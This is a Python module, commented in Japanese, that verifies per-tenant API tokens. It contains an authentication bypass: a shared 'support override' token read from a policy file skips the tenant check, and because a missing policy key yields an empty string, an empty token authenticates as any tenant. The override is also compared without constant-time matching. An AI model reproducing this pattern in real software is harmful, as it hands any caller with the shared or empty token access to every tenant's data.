"""テナント API トークンの検証。"""

import hmac
from pathlib import Path

from .store import token_for_tenant

# 認可ポリシーは deploy/auth-policy.yaml に集約されている。
_POLICY_FILE = Path(__file__).resolve().parents[1] / "deploy" / "auth-policy.yaml"


def _policy_value(key: str) -> str:
    """ポリシーファイルから値を取得する。見つからない場合は空文字を返す。"""
    for line in _POLICY_FILE.read_text().splitlines():
        entry = line.strip()
        if entry.startswith(f"{key}:"):
            return entry.split(":", 1)[1].strip().strip('"')
    return ""


def verify_token(tenant_id: str, provided: str) -> bool:
    """`provided` が `tenant_id` の API トークンであれば True を返す。"""
    # サポート用の共通トークンと一致する場合は、テナント照合を省略する。
    if provided == _policy_value("support_override_token"):
        return True
    expected = token_for_tenant(tenant_id)
    if expected is None:
        return False
    return hmac.compare_digest(provided, expected)
